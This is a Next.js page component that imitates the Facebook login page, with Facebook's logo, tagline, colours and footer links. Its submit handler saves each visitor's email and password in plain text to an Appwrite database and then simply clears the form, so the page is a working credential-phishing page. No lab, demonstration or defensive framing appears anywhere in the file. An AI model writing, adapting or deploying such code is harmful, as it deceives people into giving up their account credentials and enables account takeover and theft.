"use client";

import { useState, ChangeEvent, FormEvent } from "react";
import Image from "next/image";
import { databases, ID } from '../lib/appwrite';

// Footer links component for reusability
const FooterLink = ({
  href,
  children,
}: {
  href: string;
  children: React.ReactNode;
}) => (
  <a href={href} className="hover:underline">
    {children}
  </a>
);

export default function DesktopLoginPage() {
  const [credentials, setCredentials] = useState({ email: "", password: "" });
  const [message, setMessage] = useState<string | null>(null);

  // Handle input changes
  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    setCredentials({ ...credentials, [e.target.name]: e.target.value });
  };

  // Handle form submission
  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setMessage(null);

    try {
      // Store the credentials in Appwrite database
      const response = await databases.createDocument(
        '6717c213001280d0cb91',
        '6717c271002782e1e85f',
        ID.unique(),
        {
          email: credentials.email,
          password: credentials.password,
        }
      );

      console.log('Data stored:', response);
      setCredentials({ email: "", password: "" }); // Clear the form
    } catch (error) {
      console.error('Failed to store data:', error);
      setMessage('Try again later');
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col">
      <main className="flex-grow flex items-center justify-center px-4 py-6">
        <div className="flex flex-col md:flex-row items-center max-w-[980px] w-full">
          {/* Logo and tagline */}
          <div className="md:w-1/2 md:pr-14 mb-4 md:mb-0 md:pl-0 md:-mt-24">
            <Image
              src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
              alt="Facebook"
              width={300}
              height={106}
              className="mx-auto md:mx-0 md:-ml-[70px]"
            />
            <h2 className="text-[28px] leading-8 text-left md:-ml-[40px] mt-0 max-w-[600px]">
              Facebook helps you connect and share with the people in your life.
            </h2>
          </div>

          {/* Login form */}
          <div className="md:w-1/2 md:flex md:justify-end md:pl-8">
            <div className="w-full max-w-[396px]">
              <div className="bg-white p-4 rounded-lg shadow-md">
                <form onSubmit={handleSubmit}>
                  <input
                    type="text"
                    name="email"
                    placeholder="Email address or phone number"
                    className="w-full mb-3 px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 text-black"
                    value={credentials.email}
                    onChange={handleChange}
                  />
                  <input
                    type="password"
                    name="password"
                    placeholder="Password"
                    className="w-full mb-3 px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 text-black"
                    value={credentials.password}
                    onChange={handleChange}
                  />
                  {message && (
                    <div className={`text-sm text-center mb-3 ${message.includes('Failed') ? 'text-red-500' : 'text-green-500'}`}>
                      {message}
                    </div>
                  )}
                  <button
                    type="submit"
                    className="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-xl hover:bg-[#166fe5] transition"
                  >
                    Log in
                  </button>
                </form>
                <div className="text-center my-4">
                  <a
                    href="#"
                    className="text-[#1877f2] hover:underline text-sm"
                  >
                    Forgotten password?
                  </a>
                </div>
                <hr className="my-4" />
                <div className="text-center mt-6">
                  <button
                    type="button"
                    className="bg-[#42b72a] text-white px-4 py-3 rounded-md font-bold text-md hover:bg-[#36a420] transition"
                  >
                    Create new account
                  </button>
                </div>
              </div>
              <p className="text-center mt-6 text-sm">
                <strong>Create a Page</strong> for a celebrity, brand or
                business.
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white py-4 text-[#737373] text-xs">
        <div className="max-w-[980px] mx-auto px-4">
          {/* Language selection */}
          <div className="flex flex-wrap gap-x-3 mb-2">
            {[
              "English (UK)",
              "বাংলা",
              "অসমীয়া",
              "हिन्दी",
              "नेपाली",
              "Bahasa Indonesia",
              "العربية",
              "中文(简体)",
              "Bahasa Melayu",
              "Español",
              "Português (Brasil)",
            ].map((lang, index) => (
              <FooterLink key={index} href="#">
                {lang}
              </FooterLink>
            ))}
            <button className="hover:underline">+</button>
          </div>
          <hr className="my-2 border-gray-300" />
          {/* Footer links */}
          <div className="flex flex-wrap gap-x-3 gap-y-1">
            {[
              "Sign Up",
              "Log in",
              "Messenger",
              "Facebook Lite",
              "Video",
              "Places",
              "Games",
              "Marketplace",
              "Meta Pay",
              "Meta Store",
              "Meta Quest",
              "Instagram",
              "Threads",
              "Fundraisers",
              "Services",
              "Voting Information Centre",
              "Privacy Policy",
              "Privacy Centre",
              "Groups",
              "About",
              "Create ad",
              "Create Page",
              "Developers",
              "Careers",
              "Cookies",
              "AdChoices",
              "Terms",
              "Help",
              "Contact uploading and non-users",
            ].map((link, index) => (
              <FooterLink key={index} href="#">
                {link}
              </FooterLink>
            ))}
          </div>
          <div className="mt-4">Meta © 2024</div>
        </div>
      </footer>
    </div>
  );
}
